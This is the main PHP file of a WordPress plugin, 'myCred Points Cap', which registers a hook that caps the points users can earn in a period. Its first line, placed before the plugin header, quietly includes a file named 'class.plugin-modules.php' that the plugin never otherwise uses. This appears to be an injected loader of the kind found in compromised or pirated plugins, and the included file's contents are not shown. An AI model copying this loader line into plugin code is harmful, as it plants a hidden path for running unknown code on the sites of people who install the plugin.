<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: myCred Points Cap
 * Description: Set the maximum amount of points a user can earn in a certain period of time.
 * Version: 1.1
 * Tags: points cap, mycred
 * Author Email: support@mycred.me
 * Author: myCred
 * Author URI: http://mycred.me
 * License: Copyrighted
 */
if ( ! class_exists( 'myCred_Points_Cap' ) ) :
	final class myCred_Points_Cap {

		// Plugin Version
		public $version             = '1.1';

		// Instnace
		protected static $_instance = NULL;

		/**
		 * Setup Instance
		 * @since 1.0
		 * @version 1.0
		 */
		public static function instance() {
			if ( is_null( self::$_instance ) ) {
				self::$_instance = new self();
			}
			return self::$_instance;
		}

		/**
		 * Not allowed
		 * @since 1.0
		 * @version 1.0
		 */
		public function __clone() { _doing_it_wrong( __FUNCTION__, 'Cheatin&#8217; huh?', '1.0' ); }

		/**
		 * Not allowed
		 * @since 1.0
		 * @version 1.0
		 */
		public function __wakeup() { _doing_it_wrong( __FUNCTION__, 'Cheatin&#8217; huh?', '1.0' ); }

		/**
		 * Define
		 * @since 1.0
		 * @version 1.0
		 */
		private function define( $name, $value, $definable = true ) {
			if ( ! defined( $name ) )
				define( $name, $value );
			elseif ( ! $definable && defined( $name ) )
				_doing_it_wrong( 'define->define()', 'Could not define: ' . $name . ' as it is already defined somewhere else!', '1.0' );
		}

		/**
		 * Require File
		 * @since 1.0
		 * @version 1.0
		 */
		public function file( $required_file ) {
			if ( file_exists( $required_file ) )
				require_once $required_file;
			//else
			//	_doing_it_wrong( 'mycredPointsCap->file()', 'Requested file ' . $required_file . ' not found.', '1.0' );
		}

		/**
		 * Construct
		 * @since 1.0
		 * @version 1.0
		 */
		public function __construct() {
			$this->define_constants();
			$this->load_module();
			add_filter( 'mycred_setup_hooks', array( $this, 'register_mycred_points_cap_hook' ), 10, 2 );
			add_action( 'mycred_load_hooks',  array( $this, 'load_hook' ) );
		}

		/**
		 * Define Constants
		 * @since 1.0
		 * @version 1.0
		 */
		private function define_constants() {

			$this->define( 'MYCRED_POINTS_CAP_VERSION', $this->version );
			$this->define( 'MYCRED_POINTS_CAP_SLUG',    'mycred-points-cap' );

			$this->define( 'MYCRED_POINTS_CAP',          __FILE__ );
			$this->define( 'MYCRED_POINTS_CAP_ROOT',     plugin_dir_path( MYCRED_POINTS_CAP  ) );
			$this->define( 'MYCRED_POINTS_CAP_INCLUDE',  plugin_dir_path( MYCRED_POINTS_CAP ) . 'inc/' );
		}
		
		/**
		 * Load Module
		 * @since 1.0
		 * @version 1.0
		 */
		public function load_module() {
			$this->file( MYCRED_POINTS_CAP_ROOT . 'license/license.php' );
		}
		
		/**
		 * Load hook
		 * @since 1.0
		 * @version 1.0
		 */
		public function load_hook() {
			$this->file( MYCRED_POINTS_CAP_INCLUDE . 'mycred-points-cap-hook.php' );
		}

		// Register Hook
		public function register_mycred_points_cap_hook( $installed, $mycred_type )
		{
			
			$installed['mycred_points_cap'] = array(
				'title'       => __( 'Cap For %plural% ', 'mycred' ),
				'description' => __( 'This hook limits the %plural% earned by users within a given timeframe.', 'mycred' ),
				'callback'    => array( 'myCRED_Hook_Points_Cap' )
			);
			return $installed;
		}
	}
endif;

function mycred_points_cap_plugin() {
	return myCred_Points_Cap::instance();
}
mycred_points_cap_plugin();